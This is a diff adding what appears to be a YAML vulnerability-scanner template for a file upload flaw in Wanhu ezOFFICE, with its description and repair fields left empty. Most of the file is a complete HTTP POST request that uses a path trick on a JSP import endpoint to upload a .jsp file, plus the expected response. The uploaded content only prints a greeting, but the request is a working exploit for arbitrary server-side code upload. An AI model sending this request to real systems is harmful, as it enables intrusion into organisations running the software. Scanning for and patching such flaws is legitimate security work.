@@ -1,0 +1,39 @@
+id:
+
+info:
+  name: 万户 ezOFFICE 文件上传漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: POST
+  path: /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;ad?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp
+  headers:
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+    Content-Length: 435
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLNvGnzm2o3sImhz
+    Accept-Encoding: gzip, deflate
+    Connection: close
+  data: |
+    ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+    Content-Disposition: form-data; name="photo"; filename="11.jsp"
+    Content-Type: application/octet-stream
+
+    <% out.println("Hello ezOFFICE"); %>
+    ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+    Content-Disposition: form-data; name="continueUpload"
+
+    0
+    ------WebKitFormBoundaryvLNvGnzm2o3sImhz
+    Content-Disposition: form-data; name="submit"
+
+    导　入
+    ------WebKitFormBoundaryvLNvGnzm2o3sImhz--
+response1:
+  headers:
+  body: jsp
+  code: 200
+requests2:
+response2:
+
